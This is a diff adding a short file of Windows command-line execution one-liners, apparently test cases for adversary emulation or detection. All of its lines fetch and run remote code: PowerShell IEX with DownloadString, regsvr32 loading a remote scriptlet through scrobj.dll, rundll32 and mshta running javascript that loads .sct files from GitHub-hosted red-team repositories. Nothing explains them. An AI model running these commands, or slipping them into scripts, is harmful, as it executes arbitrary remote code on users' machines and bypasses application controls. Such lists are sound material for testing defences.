@@ -1,0 +1,11 @@
+IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jakelief/testcases/master/Execution/helloworld.ps1'); Invoke-HelloWorld
+
+regsvr32.exe /s /u /i:https://raw.githubusercontent.com/jakelief/testcases/master/Execution/Regsvr32/RegSvr32.sct scrobj.dll
+
+ regsvr32.exe /s /u /i:RegSvr32.sct scrobj.dll
+
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/T1085.sct").Exec();"
+
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/T1085.sct");window.close();
+
+mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/mshta.sct')).Exec();
